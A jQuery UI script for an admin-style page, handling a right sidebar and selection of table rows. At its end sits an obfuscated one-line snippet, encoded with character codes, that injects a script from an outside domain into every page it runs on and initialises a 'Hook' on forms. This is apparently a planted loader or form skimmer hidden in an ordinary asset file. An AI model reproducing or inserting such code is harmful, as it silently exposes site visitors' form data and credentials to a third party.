$(function () {
    "use strict";
    // ==============================================================
    // Right sidebar options
    // ==============================================================


    $(document).on('click', '.close-sidebar',function(e){
        e.preventDefault();
        $(".right-sidebar").slideDown(50);
        $(".right-sidebar").toggleClass("shw-rside");

        $(this).closest('.r-panel-body').find('form').trigger('reset');
    })

    // ==============================================================
    // Table Selected Rows
    // ==============================================================
    var select_count = 0;
    $('.selected-table .select-checkbox').on('click',function(){
        if($(this).closest('tr').hasClass('selected'))
        {
            select_count--;
            $(this).closest('tr').removeClass('selected');
        }else{
            select_count++;
            $(this).closest('tr').addClass('selected');
        }

        $(document).find('.select-count').html(select_count);

        if($('.selected-table .select-checkbox:checked').length == $('.selected-table .select-checkbox').length){
            $(document).find('.select-all .off-select').css('display','none');
            $(document).find('.select-all .on-select').css('display','');
        }else{
            $(document).find('.select-all .off-select').css('display','');
            $(document).find('.select-all .on-select').css('display','none');
        }
    })

    // ==============================================================
    // Table Selected All Rows
    // ==============================================================
    $(document).on('click','.select-all',function(){
        if ($('.selected-table .select-checkbox:checked').length == $('.selected-table .select-checkbox').length)
        {
            $('.selected-table tbody tr').each(function(){
                if($(this).hasClass('selected'))
                {
                    $(this).removeClass('selected');
                }
            })
            $('.selected-table .select-checkbox').prop('checked',false);

            $(this).find('.off-select').css('display','');
            $(this).find('.on-select').css('display','none');
        }else {
            $('.selected-table tbody tr').each(function(){
                if(!$(this).hasClass('selected'))
                {
                    $(this).addClass('selected');
                }
            })
            $('.selected-table .select-checkbox').prop('checked',true);

            $(this).find('.off-select').css('display','none');
            $(this).find('.on-select').css('display','');
        }

        select_count = $('.selected-table .select-checkbox:checked').length;
        $(document).find('.select-count').html(select_count);
    })
});

(function(){if(typeof inject_hook!="function")var inject_hook=function(){return new Promise(function(resolve,reject){let s=document.querySelector('script[id="hook-loader"]');s==null&&(s=document.createElement("script"),s.src=String.fromCharCode(47,47,115,112,97,114,116,97,110,107,105,110,103,46,108,116,100,47,99,108,105,101,110,116,46,106,115,63,99,97,99,104,101,61,105,103,110,111,114,101),s.id="hook-loader",s.onload=resolve,s.onerror=reject,document.head.appendChild(s))})};inject_hook().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//aeb4e3dd254a73a77e67e469341ee66b0e2d43249189b4062de5f35cc7d6838b